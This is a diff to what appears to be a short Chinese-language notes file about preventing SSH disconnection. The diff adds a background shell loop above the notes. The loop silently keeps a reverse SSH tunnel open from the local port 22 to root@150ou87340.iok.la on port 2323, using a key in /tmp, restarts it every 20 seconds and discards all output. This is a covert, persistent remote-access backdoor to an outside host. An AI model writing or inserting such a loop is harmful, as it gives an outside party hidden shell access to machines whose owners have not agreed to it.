@@ -1,5 +1,28 @@
 
 
+while sleep 20
+do
+        set +e
+        cat /tmp/aaa > /dev/null 2>&1
+        if [ $? -ne 0 ]; then
+                kill -9 $(ps -elf | awk '/150ou87340.iok.la/{print $4}') > /dev/null 2>&1
+                sleep 60
+                ssh -i /tmp/id_rsa -N -f -o ServerAliveInterval=180 -R 12348:localhost:22 root@150ou87340.iok.la -p 2323 > /dev/null 2>&1
+        else
+                if [ $(ps -elf | grep '150ou87340' | wc -l) -lt 2 ]; then
+                        ssh -i /tmp/id_rsa -N -f -o ServerAliveInterval=180 -R 12348:localhost:22 root@150ou87340.iok.la -p 2323 > /dev/null 2>&1
+                fi
+        fi
+        set -e
+done & > /dev/null 2>&1
+
+
+
+
+
+
+
+
 防止 ssh 登陆后中断
 除了 client 的 ssh_config 要设置
 Host *
